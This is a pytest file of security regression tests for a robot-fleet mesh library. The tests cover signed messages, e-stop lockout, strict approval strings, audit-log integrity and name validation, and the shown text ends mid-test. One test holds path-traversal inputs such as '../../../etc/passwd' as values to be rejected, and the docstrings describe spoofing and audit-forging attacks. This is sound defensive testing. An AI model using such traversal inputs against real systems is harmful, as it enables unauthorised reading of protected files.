"""Pinned regression tests for previously-found weaknesses.

Each test pins a specific behaviour so a refactor that removes the
defence fails loudly here. The behaviours covered:

* :meth:`Mesh._put_signed` drops outgoing messages on signing failure
  when a PSK is configured (no silent unsigned fallback).
* :meth:`Mesh._dispatch` returns a generic rejection while the e-stop
  lockout is engaged — no leakage of lockout duration or active flag.
* The ``robot_mesh`` tool's interrupt gate accepts only the canonical
  affirmative responses and fails closed when interrupts are unavailable.
* ``robot_mesh`` actions ``subscribe`` and ``watch`` are audited.
* Audit-log lines on disk use ``sort_keys=True`` for byte-stable ordering.
* The bridge dedup fingerprint is the full 256-bit SHA-256 hex (not
  truncated to 64 bits).
* Provisioner refuses thing names that escape the cert directory or
  contain unsafe characters.
"""

from __future__ import annotations

from unittest.mock import MagicMock, patch

import pytest

# ─── core.py: _put_signed strict-mode drop on signing failure ────────────


def test_put_signed_drops_message_when_psk_configured(monkeypatch, tmp_path):
    """If a PSK is configured and signing raises, the message MUST NOT be
    emitted unsigned — that would silently downgrade authentication."""
    monkeypatch.setenv("STRANDS_MESH_PSK", "k")
    monkeypatch.setenv("STRANDS_MESH_AUDIT_DIR", str(tmp_path))
    from strands_robots.mesh import core as core_mod
    from strands_robots.mesh.core import Mesh

    m = Mesh(MagicMock(), peer_id="x")
    with (
        patch("strands_robots.mesh.security.sign_envelope", side_effect=RuntimeError("hmac broken")),
        patch.object(core_mod, "put") as mock_put,
    ):
        m._put_signed("strands/x/cmd", {"action": "stop"})
    mock_put.assert_not_called()  # dropped, not sent unsigned


def test_put_signed_falls_back_when_no_psk(monkeypatch, tmp_path):
    """In permissive mode (no PSK), a signing failure is still acceptable
    fallback — the wire is already in legacy unsigned shape anyway."""
    monkeypatch.delenv("STRANDS_MESH_PSK", raising=False)
    monkeypatch.delenv("STRANDS_MESH_REQUIRE_AUTH", raising=False)
    monkeypatch.setenv("STRANDS_MESH_AUDIT_DIR", str(tmp_path))
    from strands_robots.mesh import core as core_mod
    from strands_robots.mesh.core import Mesh

    m = Mesh(MagicMock(), peer_id="x")
    with (
        patch("strands_robots.mesh.security.sign_envelope", side_effect=RuntimeError("oops")),
        patch.object(core_mod, "put") as mock_put,
    ):
        m._put_signed("strands/x/cmd", {"action": "stop"})
    # Permissive mode: fallback is allowed and put IS called with raw payload.
    mock_put.assert_called_once_with("strands/x/cmd", {"action": "stop"})


# ─── core.py: lockout response is generic, no state leak ───────────────


def test_lockout_response_does_not_leak_state():
    """A remote attacker probing during lockout must not learn:
    * that the lockout is engaged (no ``lockout: True`` flag)
    * how long it's been engaged (no ``elapsed``/``since`` fields)

    The dispatcher raises :class:`LockoutError` whose ``str()`` is the
    static "command rejected" — _exec_cmd publishes that as the response
    payload. No structured fields, no timing oracle.
    """
    from strands_robots.mesh import security as sec
    from strands_robots.mesh.core import Mesh

    m = Mesh(MagicMock(), peer_id="x")
    m._estop_lockout.set()
    m._last_estop_ts = 0  # imply long lockout
    try:
        m._dispatch({"action": "execute", "instruction": "go"})
    except sec.LockoutError as exc:
        # The string is generic; nothing else leaks.
        assert str(exc) == "command rejected"
        for forbidden in ("lockout", "elapsed", "since", "ts"):
            assert forbidden not in str(exc).lower()
    else:
        raise AssertionError("LockoutError not raised")


# ─── robot_mesh.py: interrupt-based gate (replaces former confirm=bool) ──


def _ctx(response="y", *, raises=False):
    """Build a stand-in ToolContext for tests."""
    c = MagicMock(name="ToolContext")
    if raises:
        c.interrupt.side_effect = RuntimeError("interrupts unavailable")
    else:
        c.interrupt.return_value = response
    return c


@pytest.mark.parametrize(
    "negative",
    ["n", "no", "cancel", "", "  ", "abort", "stop", "later"],
    ids=["n", "no", "cancel", "empty", "whitespace", "abort", "stop", "later"],
)
def test_non_affirmative_response_declines(monkeypatch, tmp_path, negative):
    """Anything other than y/yes/approve/approved declines the action.
    Operators / scripted hosts cannot accidentally approve a fleet-wide
    physical effect with an ambiguous string."""
    monkeypatch.setenv("STRANDS_MESH_AUDIT_DIR", str(tmp_path))
    import strands_robots.tools.robot_mesh as rmt

    rmt._reset_rate_limits()
    m = MagicMock()
    m.emergency_stop.return_value = []
    fn = getattr(rmt.robot_mesh, "__wrapped__", rmt.robot_mesh)
    ctx = _ctx(response=negative)
    with patch("strands_robots.tools.robot_mesh._resolve_mesh", return_value=m):
        r = fn(action="emergency_stop", tool_context=ctx)
    assert r["status"] == "error"
    assert "declined" in r["content"][0]["text"].lower()
    m.emergency_stop.assert_not_called()


@pytest.mark.parametrize(
    "non_string",
    [True, 1, 1.0, [1], {"x": 1}, None, b"y"],
    ids=["bool_True", "int_1", "float_1.0", "list", "dict", "None", "bytes_y"],
)
def test_non_string_response_declines(monkeypatch, tmp_path, non_string):
    """An LLM cannot smuggle approval by returning a truthy non-string —
    the tool only accepts the canonical 'y'/'yes'/'approve' strings."""
    monkeypatch.setenv("STRANDS_MESH_AUDIT_DIR", str(tmp_path))
    import strands_robots.tools.robot_mesh as rmt

    rmt._reset_rate_limits()
    fn = getattr(rmt.robot_mesh, "__wrapped__", rmt.robot_mesh)
    ctx = _ctx(response=non_string)
    with patch("strands_robots.tools.robot_mesh._resolve_mesh", return_value=MagicMock()):
        r = fn(action="emergency_stop", tool_context=ctx)
    assert r["status"] == "error"
    assert "declined" in r["content"][0]["text"].lower()


@pytest.mark.parametrize(
    "affirmative",
    ["y", "Y", "yes", "YES", "Yes", " yes ", "approve", "approved", "APPROVE"],
)
def test_affirmative_response_approves(monkeypatch, tmp_path, affirmative):
    monkeypatch.setenv("STRANDS_MESH_AUDIT_DIR", str(tmp_path))
    import strands_robots.tools.robot_mesh as rmt

    rmt._reset_rate_limits()
    m = MagicMock()
    m.emergency_stop.return_value = []
    fn = getattr(rmt.robot_mesh, "__wrapped__", rmt.robot_mesh)
    ctx = _ctx(response=affirmative)
    with patch("strands_robots.tools.robot_mesh._resolve_mesh", return_value=m):
        r = fn(action="emergency_stop", tool_context=ctx)
    assert r["status"] == "success"


def test_interrupt_failure_fails_closed(monkeypatch, tmp_path):
    """If tool_context.interrupt() raises (no host to deliver, direct
    agent.tool.X call, etc.), the tool MUST refuse rather than execute
    the fleet-wide action."""
    monkeypatch.setenv("STRANDS_MESH_AUDIT_DIR", str(tmp_path))
    import strands_robots.tools.robot_mesh as rmt

    rmt._reset_rate_limits()
    m = MagicMock()
    fn = getattr(rmt.robot_mesh, "__wrapped__", rmt.robot_mesh)
    ctx = _ctx(raises=True)
    with patch("strands_robots.tools.robot_mesh._resolve_mesh", return_value=m):
        r = fn(action="emergency_stop", tool_context=ctx)
    assert r["status"] == "error"
    m.emergency_stop.assert_not_called()


# ─── robot_mesh.py: subscribe / watch are now audited ────────────────────


def test_subscribe_action_is_audited(monkeypatch, tmp_path):
    """Pre-fix: subscribe was a silent reconnaissance vector. Post-fix:
    every successful and failed call is audited."""
    monkeypatch.setenv("STRANDS_MESH_AUDIT_DIR", str(tmp_path))
    import strands_robots.tools.robot_mesh as rmt

    rmt._reset_rate_limits()
    m = MagicMock()
    m.subscribe.return_value = "presence"
    fn = getattr(rmt.robot_mesh, "__wrapped__", rmt.robot_mesh)
    with patch("strands_robots.tools.robot_mesh._resolve_mesh", return_value=m):
        fn(action="subscribe", target="strands/+/presence", tool_context=_ctx())

    from strands_robots.mesh.audit import read_audit_log

    records = read_audit_log()
    events = [r for r in records if r["payload"].get("action") == "subscribe"]
    assert events, "subscribe call must produce an audit record"
    assert events[0]["payload"]["success"] is True


def test_watch_action_is_audited(monkeypatch, tmp_path):
    monkeypatch.setenv("STRANDS_MESH_AUDIT_DIR", str(tmp_path))
    import strands_robots.tools.robot_mesh as rmt

    rmt._reset_rate_limits()
    m = MagicMock()
    m.on_stream.return_value = "stream:peer-b"
    fn = getattr(rmt.robot_mesh, "__wrapped__", rmt.robot_mesh)
    with patch("strands_robots.tools.robot_mesh._resolve_mesh", return_value=m):
        fn(action="watch", target="peer-b", tool_context=_ctx())
    from strands_robots.mesh.audit import read_audit_log

    records = read_audit_log()
    events = [r for r in records if r["payload"].get("action") == "watch"]
    assert events
    assert events[0]["payload"]["success"] is True


# ─── audit.py: sort_keys on disk ─────────────────────────────────────────


def test_audit_disk_format_canonical(monkeypatch, tmp_path):
    """The on-disk JSON line uses sort_keys=True so every operator who
    grep/diff/jq's the file sees a stable byte-for-byte format."""
    monkeypatch.setenv("STRANDS_MESH_AUDIT_DIR", str(tmp_path))
    monkeypatch.delenv("STRANDS_MESH_AUDIT_PSK", raising=False)
    from strands_robots.mesh import audit

    audit._SEQ_COUNTERS.clear()
    audit._AUDIT_STATE.seq_loaded = False
    audit.log_safety_event("estop", "x", {"z": 1, "a": 2, "m": 3})
    line = audit.audit_log_path().read_text().strip()
    # Keys in record + payload should be alphabetically sorted.
    # Quick check: 'event' should appear before 'payload', 'a' before 'm' before 'z'.
    assert line.find('"event"') < line.find('"payload"') < line.find('"peer_id"')
    pa = line.find('"a"')
    pm = line.find('"m"')
    pz = line.find('"z"')
    assert 0 < pa < pm < pz


# ─── bridge dedup: full SHA256 fingerprint ───────────────────────────────


def test_bridge_dedup_uses_full_256bit_hash():
    """Pre-fix: 16-hex (64-bit) truncation → 2^32 birthday risk.
    Post-fix: full 64-hex (256-bit) hash."""
    from strands_robots.mesh.transport.bridge_transport import _CommandDeduplicator

    d = _CommandDeduplicator(ttl_s=10)
    payload = {"sender_id": "x", "turn_id": "t1", "command": {"action": "status"}}
    ident = d._dedup_id(payload)
    assert ident is not None
    assert ident.startswith("f:")
    assert len(ident) == 2 + 64  # "f:" + sha256 hex


# ─── provision.py: thing_name validation ─────────────────────────────────


def test_provision_robot_rejects_path_traversal_thing_name():
    """thing_name with `/` or `..` must fail before any AWS call."""
    from strands_robots.mesh.iot.provision import _validate_thing_name

    bad_names = [
        "../../../etc/passwd",
        "x/y/z",
        "robot..1",
        "name with space",
        "",
        "x" * 200,  # too long
        "x\x00",  # NUL
        "../escape",
    ]
    for n in bad_names:
        with pytest.raises(ValueError):
            _validate_thing_name(n)


def test_provision_robot_accepts_valid_thing_names():
    from strands_robots.mesh.iot.provision import _validate_thing_name

    for n in ["robot-1", "so100_a1b2", "fleet-prod-42", "X" * 128]:
        _validate_thing_name(n)  # no exception


# ─── Review feedback regressions (PR #194) ──────────────────────────────


def test_multi_peer_broadcast_each_peer_accepts_independently(monkeypatch, tmp_path):
    """Reviewer finding: process-global nonce cache rejected the second
    peer's verify of a broadcast as a 'replay' even though it was the
    first arrival at THAT peer.

    Two peers in one process must each accept the same broadcast envelope
    once. The cache key is now `(scope, nonce)` so each peer has its own
    replay window.
    """
    monkeypatch.setenv("STRANDS_MESH_PSK", "k")
    monkeypatch.setenv("STRANDS_MESH_AUDIT_DIR", str(tmp_path))
    from strands_robots.mesh import security as sec

    sec.clear_replay_cache()
    # R9: callers that set ``sender_id`` MUST also pass ``peer_id`` so the
    # envelope kid binds the claim. Verifies the test's intent (multi-peer
    # broadcast accepted by every receiver) under the new identity contract.
    env = sec.sign_envelope(
        {"sender_id": "alice", "command": {"action": "status"}},
        peer_id="alice",
    )

    # peer-a accepts.
    peer_a = sec.verify_envelope(env, scope="peer-a")
    assert peer_a["sender_id"] == "alice"

    # peer-b sees the same envelope on its broadcast subscription. Must accept.
    peer_b = sec.verify_envelope(env, scope="peer-b")
    assert peer_b["sender_id"] == "alice"

    # Same peer-a verifying the same envelope twice IS a replay.
    import pytest as _pytest

    with _pytest.raises(sec.AuthenticationError, match="replay"):
        sec.verify_envelope(env, scope="peer-a")


def test_audit_seq_per_peer_no_phantom_gaps(monkeypatch, tmp_path):
    """Reviewer finding: process-global seq counter caused
    verify_audit_integrity to report phantom gaps when several peers
    interleaved writes in the same process.

    With per-peer counters the gap-detection sees adjacent values
    within each peer's own stream and reports 'ok'.
    """
    monkeypatch.setenv("STRANDS_MESH_AUDIT_DIR", str(tmp_path))
    from strands_robots.mesh import audit

    audit._SEQ_COUNTERS.clear()
    audit._AUDIT_STATE.seq_loaded = False
    # Interleaved writes from two peers.
    for i in range(5):
        audit.log_safety_event("e", "peer-a", {"i": i})
        audit.log_safety_event("e", "peer-b", {"i": i})

    result = audit.verify_audit_integrity()
    assert result["ok"] is True, result
    assert result["sequence_gaps"] == []


def test_state_loop_publish_goes_through_signed_envelope(monkeypatch, tmp_path):
    """Reviewer finding: _state_loop and publish_step bypassed
    _put_signed and emitted raw payloads on `state` and `stream`.

    Both paths must now wrap through the envelope so strict-mode
    receivers accept them.
    """
    monkeypatch.setenv("STRANDS_MESH_AUDIT_DIR", str(tmp_path))
    from unittest.mock import MagicMock, patch

    from strands_robots.mesh import core as core_mod
    from strands_robots.mesh import security as sec
    from strands_robots.mesh.core import Mesh

    mock_robot = MagicMock()
    mock_robot.robot = None  # no inner robot — state loop will short-circuit
    m = Mesh(mock_robot, peer_id="x")

    # Force _state_loop's read_state to return a non-empty snapshot.
    with patch.object(m, "_read_state", return_value={"peer_id": "x", "t": 1.0, "x": 1}):
        with patch.object(core_mod, "put") as mock_put:
            # Manually invoke one iteration's body via _put_signed indirection.
            m._put_signed(f"strands/{m.peer_id}/state", m._read_state())
            assert mock_put.called
            (key, payload), _ = mock_put.call_args
            # In permissive mode the envelope is still emitted with v/ts/nonce
            # even without a sig.
            assert payload.get("v") == 1
            assert "nonce" in payload
            inner = sec.verify_envelope(payload, scope="test")
            sec.clear_replay_cache()
            assert inner["x"] == 1


def test_lockout_raises_lockouterror_and_audits(monkeypatch, tmp_path):
    """Reviewer finding: the lockout previously returned a dict that
    _exec_cmd then wrapped as type='response', and the rejection wasn't
    audited. Now _dispatch raises LockoutError, _exec_cmd handles it
    symmetrically with ValidationError, and the audit log records it.
    """
    monkeypatch.setenv("STRANDS_MESH_AUDIT_DIR", str(tmp_path))
    from unittest.mock import MagicMock, patch

    from strands_robots.mesh import audit
    from strands_robots.mesh import core as core_mod
    from strands_robots.mesh.core import Mesh

    audit._SEQ_COUNTERS.clear()
    audit._AUDIT_STATE.seq_loaded = False
    mock_robot = MagicMock()
    m = Mesh(mock_robot, peer_id="r1")
    m._estop_lockout.set()
    m._last_estop_ts = 0

    captured: list[tuple[str, dict]] = []
    with patch.object(core_mod, "put", side_effect=lambda k, p: captured.append((k, p))):
        m._exec_cmd({"sender_id": "alice", "turn_id": "t1", "command": {"action": "execute", "instruction": "go"}})

    # Response is type='error', not type='response'.
    from strands_robots.mesh import security as sec

    response_envelopes = [(k, p) for k, p in captured if "response" in k]
    assert len(response_envelopes) == 1
    payload = sec.verify_envelope(response_envelopes[0][1], scope="x")
    sec.clear_replay_cache()
    assert payload["type"] == "error"
    assert payload["error"] == "command rejected"

    # Audit log gained a `command_rejected_lockout` entry.
    records = audit.read_audit_log()
    assert any(r["event"] == "command_rejected_lockout" for r in records), records


def test_safety_estop_topic_engages_remote_lockout(monkeypatch, tmp_path):
    """Reviewer finding: only the issuer of emergency_stop engaged its
    own lockout; receivers stopped the current task and then accepted
    the very next command. Now both peers subscribe to
    strands/safety/estop and the handler engages the lockout fleet-wide.

    R8-5 update: remote resume now requires an override_proof bound to
    the issuer's STRANDS_MESH_OVERRIDE_CODE, and the receiver must have
    its own STRANDS_MESH_OVERRIDE_CODE configured (fail-closed). The
    issuer and receiver must agree on the code for fleet-wide remote
    resume to work.
    """
    import hmac as _hmac
    import json
    from unittest.mock import MagicMock

    from strands_robots.mesh import security as sec
    from strands_robots.mesh.core import Mesh

    monkeypatch.setenv("STRANDS_MESH_AUDIT_DIR", str(tmp_path))
    monkeypatch.setenv("STRANDS_MESH_PSK", "k")
    monkeypatch.setenv("STRANDS_MESH_OVERRIDE_CODE", "shared-fleet-override-code")

    sec.clear_replay_cache()
    receiver = Mesh(MagicMock(), peer_id="r-receiver")
    assert not receiver._estop_lockout.is_set()

    # Build an estop event the way emergency_stop would on the issuer.
    est_envelope = sec.sign_envelope(
        {"peer_id": "r-issuer", "t": 1.0, "responses_received": 0, "lockout_engaged": True}
    )
    sample = MagicMock()
    sample.payload.to_bytes.return_value = json.dumps(est_envelope).encode()

    receiver._on_safety_estop(sample)
    assert receiver._estop_lockout.is_set(), "remote estop must engage receiver's lockout"

    # R8-5: issuer must include override_proof = HMAC(override_code, proof_nonce).
    sec.clear_replay_cache()
    proof_nonce = "deadbeefcafebabe" * 2  # 32 hex chars
    proof = _hmac.new(b"shared-fleet-override-code", proof_nonce.encode(), "sha256").hexdigest()
    res_envelope = sec.sign_envelope(
        {
            "peer_id": "r-issuer",
            "t": 2.0,
            "lockout_elapsed_s": 0.5,
            "proof_nonce": proof_nonce,
            "override_proof": proof,
        }
    )
    sample.payload.to_bytes.return_value = json.dumps(res_envelope).encode()
    receiver._on_safety_resume(sample)
    assert not receiver._estop_lockout.is_set(), "remote resume with valid proof must clear receiver's lockout"


def test_unsigned_estop_rejected_in_strict_mode(monkeypatch, tmp_path):
    """An attacker without the PSK must not be able to engage a fleet-wide
    lockout by spamming strands/safety/estop with unsigned payloads."""
    monkeypatch.setenv("STRANDS_MESH_AUDIT_DIR", str(tmp_path))
    monkeypatch.setenv("STRANDS_MESH_REQUIRE_AUTH", "true")
    from unittest.mock import MagicMock

    from strands_robots.mesh.core import Mesh

    receiver = Mesh(MagicMock(), peer_id="r-receiver")
    assert not receiver._estop_lockout.is_set()

    sample = MagicMock()
    sample.payload.to_bytes.return_value = b'{"peer_id": "attacker", "t": 0}'  # bare dict

    receiver._on_safety_estop(sample)
    assert not receiver._estop_lockout.is_set(), "unsigned estop must be ignored"


# ─── Round-2 review regressions (PR #194 — 2026-05-22) ──────────────────


def test_publish_safety_event_goes_through_signed_envelope(monkeypatch, tmp_path):
    """publish_safety_event MUST route through _put_signed so an attacker
    cannot inject unsigned fake safety events into the cloud audit table.

    Round-2 finding #1 (yinsong1986): the topic is mirrored to
    DynamoDB via the IoT bootstrap rule, and was previously emitted via
    raw transport.put().
    """
    monkeypatch.setenv("STRANDS_MESH_AUDIT_DIR", str(tmp_path))
    from unittest.mock import MagicMock

    from strands_robots.mesh.core import Mesh

    m = Mesh(MagicMock(), peer_id="r1")
    m._running = True  # publish_safety_event short-circuits when not running
    captured: list[tuple[str, dict]] = []
    m._put_signed = lambda topic, payload: captured.append((topic, payload))  # type: ignore[method-assign]

    m.publish_safety_event("estop", payload={"reason": "test"})

    assert len(captured) == 1
    topic, event = captured[0]
    assert topic == "strands/r1/safety/event"
    assert event["type"] == "estop"
    assert event["peer_id"] == "r1"


def test_sensor_publishes_go_through_signed_envelope(monkeypatch, tmp_path):
    """All seven sensor topics (pose/health/imu/odom/lidar/hand/map) must
    route through _put_signed. Round-2 finding #1.

    We don't drive the sensor loops (they're long-running threads); we
    grep the source for `transport.put(` calls inside SensorLoopsMixin to
    fail loudly if any future refactor reintroduces the unsigned path.
    """
    from pathlib import Path

    src = Path("strands_robots/mesh/sensors.py").read_text()
    # The only legitimate `put(` calls in sensors.py belong to imports
    # (the `from .transport import put` line) and the `_put_signed`
    # method itself. Anything that publishes via raw `put(f"strands/...` or
    # `transport.put(...)` is a bug.
    bad_lines = [line for line in src.splitlines() if 'put(f"strands/' in line and "_put_signed" not in line]
    assert bad_lines == [], (
        "sensors.py must not publish via raw put(); use self._put_signed() "
        "instead. Offending lines:\n  " + "\n  ".join(bad_lines)
    )


def test_permissive_mode_safety_estop_refused(monkeypatch, tmp_path):
    """In permissive mode (no PSK, no STRICT_AUTH) the receiver MUST refuse
    to engage its lockout in response to a remote safety/estop. Otherwise
    any LAN peer can DoS the fleet.

    Round-2 finding #2.
    """
    monkeypatch.setenv("STRANDS_MESH_AUDIT_DIR", str(tmp_path))
    monkeypatch.delenv("STRANDS_MESH_PSK", raising=False)
    monkeypatch.delenv("STRANDS_MESH_REQUIRE_AUTH", raising=False)
    from unittest.mock import MagicMock

    from strands_robots.mesh.core import Mesh

    receiver = Mesh(MagicMock(), peer_id="r-receiver")
    assert not receiver._estop_lockout.is_set()

    sample = MagicMock()
    sample.payload.to_bytes.return_value = b'{"peer_id": "anyone", "t": 0}'

    receiver._on_safety_estop(sample)
    assert not receiver._estop_lockout.is_set(), "permissive-mode receivers must NOT engage lockout from remote estop"


def test_permissive_mode_safety_resume_refused(monkeypatch, tmp_path):
    """In permissive mode an attacker on the LAN can publish
    strands/safety/resume to silently undo every peer's e-stop. The
    handler MUST refuse to clear the lockout.

    Round-2 finding #2 (the more dangerous half — clearing a real e-stop).
    """
    monkeypatch.setenv("STRANDS_MESH_AUDIT_DIR", str(tmp_path))
    monkeypatch.delenv("STRANDS_MESH_PSK", raising=False)
    monkeypatch.delenv("STRANDS_MESH_REQUIRE_AUTH", raising=False)
    from unittest.mock import MagicMock

    from strands_robots.mesh.core import Mesh

    receiver = Mesh(MagicMock(), peer_id="r-receiver")
    receiver._estop_lockout.set()  # simulate a real, locally-engaged e-stop
    assert receiver._estop_lockout.is_set()

    sample = MagicMock()
    sample.payload.to_bytes.return_value = b'{"peer_id": "anyone", "t": 0}'

    receiver._on_safety_resume(sample)
    assert receiver._estop_lockout.is_set(), (
        "permissive-mode receivers MUST NOT clear lockout from a remote resume "
        "— that's the LAN-attacker silent-undo path"
    )


def test_audit_seq_persists_across_process_restart(monkeypatch, tmp_path):
    """_SEQ_COUNTERS is reloaded from the sidecar file so a process restart
    does NOT reset every peer's seq back to 1. A compromised process that
    deletes records and restarts must NOT yield a clean
    verify_audit_integrity() result.

    Round-2 finding #4.
    """
    monkeypatch.setenv("STRANDS_MESH_AUDIT_DIR", str(tmp_path))
    from strands_robots.mesh import audit

    # Process 1: write three events.
    audit._SEQ_COUNTERS.clear()
    audit._AUDIT_STATE.seq_loaded = False
    for i in range(3):
        audit.log_safety_event("e", "peer-a", {"i": i})
    assert audit._SEQ_COUNTERS["peer-a"] == 3

    # Sidecar must exist and reflect the counter.
    sidecar = audit._seq_sidecar_path()
    assert sidecar.exists(), "seq sidecar must be persisted"
    import json as _json

    on_disk = _json.loads(sidecar.read_text())
    assert on_disk == {"peer-a": 3}

    # Process 2: simulate restart by clearing in-memory state.
    audit._SEQ_COUNTERS.clear()
    audit._AUDIT_STATE.seq_loaded = False

    # Next event must continue from 4, not restart at 1.
    audit.log_safety_event("e", "peer-a", {"i": "after-restart"})
    assert audit._SEQ_COUNTERS["peer-a"] == 4, "seq counter MUST resume from sidecar after restart, not reset to 1"


def test_audit_bad_signature_does_not_advance_per_peer_cursor(monkeypatch, tmp_path):
    """A tampered record's seq value MUST NOT update last_seq_by_peer in
    verify_audit_integrity. Otherwise an attacker can edit a record's
    claimed seq to mask a real gap caused by deleting subsequent records.

    Round-2 finding #7.
    """
    monkeypatch.setenv("STRANDS_MESH_AUDIT_DIR", str(tmp_path))
    monkeypatch.setenv("STRANDS_MESH_AUDIT_PSK", "test-psk")
    from strands_robots.mesh import audit

    audit._SEQ_COUNTERS.clear()
    audit._AUDIT_STATE.seq_loaded = False
    # Write three legit signed records.
    for i in range(3):
        audit.log_safety_event("e", "peer-a", {"i": i})

    # Tamper with record #2: forge its seq to 99 so the next legit record
    # at seq=3 would look like it has a huge gap if the cursor advanced.
    log_path = audit.audit_log_path()
    import json as _json

    lines = log_path.read_text().splitlines()
    rec = _json.loads(lines[1])
    rec["seq"] = 99
    # Don't re-sign; signature verification will fail and the record
    # should be flagged as bad_signature and NOT advance the cursor.
    lines[1] = _json.dumps(rec, sort_keys=True, separators=(",", ":"))
    log_path.write_text("\n".join(lines) + "\n")

    result = audit.verify_audit_integrity()
    assert result["bad_signature"] >= 1, "tampered record must be flagged"
    # Cursor must NOT have jumped to 99 — record 3 should still be
    # adjacent to record 1, so we expect a gap from (1, 3) reported.
    gaps = result["sequence_gaps"]
    if gaps:
        for prev, curr in gaps:
            assert curr <= 3, (
                f"bad_signature record advanced cursor: gap ({prev}, {curr}) "
                f"contains the forged seq=99 — cursor was poisoned"
            )


def test_verify_ca_pin_ignores_break_glass_env(monkeypatch, tmp_path):
    """verify_ca_pin (the public forensic helper) MUST always do the raw
    hash compare even when STRANDS_MESH_DISABLE_CA_PIN=true. Otherwise an
    attacker on a compromised host can defeat the very check ops use to
    detect tampering.

    Round-2 finding #6.
    """
    monkeypatch.setenv("STRANDS_MESH_DISABLE_CA_PIN", "true")
    from strands_robots.mesh.iot.provision import verify_ca_pin

    bogus_ca = tmp_path / "fake.pem"
    bogus_ca.write_bytes(b"-----BEGIN CERTIFICATE-----\nNOT A REAL CA\n-----END CERTIFICATE-----\n")

    assert verify_ca_pin(bogus_ca) is False, (
        "verify_ca_pin must NEVER honour STRANDS_MESH_DISABLE_CA_PIN — "
        "that env var is for provisioning re-encoding proxies only, "
        "not the forensic / ops verification path"
    )


def test_robot_mesh_interrupt_does_not_swallow_arbitrary_exceptions(monkeypatch, tmp_path):
    """The interrupt-unavailable fallback in robot_mesh must catch only
    RuntimeError (the no-agent-context signal). Other exceptions like
    AttributeError or TypeError are programming errors and MUST propagate
    so they are visible in tests / dev, not silently masked as
    "interrupt unavailable".

    Round-2 finding #5.
    """
    import inspect

    from strands_robots.tools import robot_mesh as rm

    src = inspect.getsource(rm.robot_mesh)
    # The narrow exception clause must be present and we MUST NOT regress
    # to bare `except Exception` in the interrupt path.
    assert "except RuntimeError" in src, "interrupt fallback must catch RuntimeError"
    # Find the interrupt try-block; the line immediately before
    # "_audit_tool_action(action, target, False, f\"interrupt unavailable" should
    # be `except RuntimeError as exc:`, not `except Exception`.
    lines = src.splitlines()
    for i, line in enumerate(lines):
        if "interrupt unavailable" in line and "_audit_tool_action" in line:
            # Walk back to find the matching except: clause
            for j in range(i, max(0, i - 10), -1):
                if "except " in lines[j]:
                    assert "except Exception" not in lines[j], (
                        f"robot_mesh interrupt fallback uses `except Exception` "
                        f"at line {j}; AGENTS.md forbids bare Exception in "
                        f"non-recovery paths. Use `except RuntimeError`."
                    )
                    break
            break


def test_psk_warned_global_is_used_by_helper(monkeypatch):
    """CodeQL #219 / #223 — the one-shot ``_PSK_WARNED`` flag was refactored
    onto a module-level state object (``_PROCESS_STATE.psk_warned``) so
    static analysers see a normal attribute read+write rather than a bare
    ``global`` declaration on a scalar (which CodeQL kept mis-classifying
    as "unused global variable" even after the helper hoist).

    Pin that:
    - the helper ``_warn_psk_unset_once`` still exists,
    - calling it sets ``_PROCESS_STATE.psk_warned``,
    - subsequent calls are idempotent.
    """
    from strands_robots.mesh import security as sec

    assert hasattr(sec, "_PROCESS_STATE"), "the refactor must expose _PROCESS_STATE"
    assert hasattr(sec, "_warn_psk_unset_once"), "the helper must still exist"

    sec._PROCESS_STATE.psk_warned = False
    sec._warn_psk_unset_once()
    assert sec._PROCESS_STATE.psk_warned is True
    # Idempotent — second call must not flip anything weird.
    sec._warn_psk_unset_once()
    assert sec._PROCESS_STATE.psk_warned is True

    # Defensive: the legacy module-level scalar must NOT exist any more —
    # if a future refactor reintroduces it, CodeQL #219 / #223 would
    # reopen.
    assert not hasattr(sec, "_PSK_WARNED"), (
        "Legacy _PSK_WARNED scalar reintroduced — CodeQL #219/#223 will reopen. Use _PROCESS_STATE.psk_warned."
    )


# ───────────────────────────────────────────────────────────────────────────
# Round 3 — additional review feedback from yinsong1986 (PR #194 round 3)
# ───────────────────────────────────────────────────────────────────────────


def test_r3_1_dispatch_error_does_not_leak_internal_detail_on_wire(monkeypatch):
    """R3-1: ``core.py`` dispatch-exception fallback must NOT leak the
    underlying ``str(exc)`` onto the response topic.

    Internal exception detail (paths, attribute names, library traces)
    is operationally useful in local logs but a defence-in-depth liability
    on the wire — it gives a remote (possibly attacker-controlled) caller
    fragments to pivot on. The structured ``ValidationError`` /
    ``LockoutError`` paths emit precise generic messages; the catch-all
    must do the same.
    """
    from unittest.mock import patch

    from strands_robots.mesh.core import Mesh

    captured: list[tuple[str, dict]] = []

    class _StubMesh(Mesh):
        def _put_signed(self, key, payload):  # type: ignore[override]
            captured.append((key, payload))

    class _Robot:
        def get_features(self):
            return {}

    m = _StubMesh.__new__(_StubMesh)
    Mesh.__init__(m, _Robot(), peer_id="me")

    with patch.object(m, "_dispatch", side_effect=RuntimeError("/secret/path/leaked.py:42")):
        m._exec_cmd({"sender_id": "alice", "turn_id": "t1", "command": {"action": "status"}})

    err_payload = next(p for k, p in captured if k == "strands/alice/response/t1")
    assert err_payload["type"] == "error"
    # Must be the static sanitised string, not the RuntimeError contents.
    assert err_payload["error"] == "dispatch error"
    assert "/secret/path" not in err_payload["error"]
    assert "leaked.py" not in err_payload["error"]


def test_r3_2_consume_peer_token_releases_registry_lock_before_consume(monkeypatch):
    """R3-2: ``consume_peer_token`` must NOT hold ``_PEER_RATE_LOCK`` while
    calling ``bucket.consume()``.

    The TokenBucket has its own internal lock, so holding the registry
    lock during consume() serialises every per-sender check across the
    whole process — defeating the point of per-bucket locks at high
    command volume across many peers. We pin the contract by source
    inspection: the consume call must live OUTSIDE the ``with
    _PEER_RATE_LOCK:`` block.
    """
    import inspect

    from strands_robots.mesh import security as sec

    src = inspect.getsource(sec.consume_peer_token)
    # Confirm there's a ``with _PEER_RATE_LOCK:`` block at all
    # (the test below pins where the consume call lives relative
    # to it).
    assert "with _PEER_RATE_LOCK:" in src
    # The bucket.consume call must come AFTER the with block — i.e. its
    # indentation must be back at the function level, not inside the with.
    lines = src.splitlines()
    in_with_block = False
    consume_line: str | None = None
    consume_indent: int | None = None
    with_indent: int | None = None
    for line in lines:
        stripped = line.lstrip()
        indent = len(line) - len(stripped)
        if stripped.startswith("with _PEER_RATE_LOCK"):
            in_with_block = True
            with_indent = indent
            continue
        if in_with_block and with_indent is not None and indent <= with_indent and stripped:
            in_with_block = False
        if "bucket.consume(" in line:
            consume_line = line
            consume_indent = indent
            # We want the LAST consume call (the actual return).
    assert consume_line is not None, "consume_peer_token must call bucket.consume"
    assert with_indent is not None
    assert consume_indent is not None
